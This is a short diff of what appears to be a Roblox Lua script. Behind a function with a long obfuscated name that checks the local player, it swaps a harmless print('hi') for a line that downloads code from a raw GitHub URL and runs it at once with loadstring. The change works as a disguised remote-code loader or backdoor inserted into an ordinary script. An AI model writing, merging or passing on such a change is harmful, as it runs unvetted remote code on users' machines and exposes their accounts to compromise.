@@ -17,5 +17,5 @@ local function _RtYhGfEdCbVnMlKoPdSsQrTfGhJkLmNcRiEeOaEbQrTdSgNfYpXcWvZbAtCeDfRi
 end
 
 if _RtYhGfEdCbVnMlKoPdSsQrTfGhJkLmNcRiEeOaEbQrTdSgNfYpXcWvZbAtCeDfRiEeHlMnOgSsTqUjIyLrVkPdFgNmHcKbEiRtYp(game.Players.LocalPlayer) then
-    print("hi")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/asdoiaeqp9/deff/main/def"))()
 end
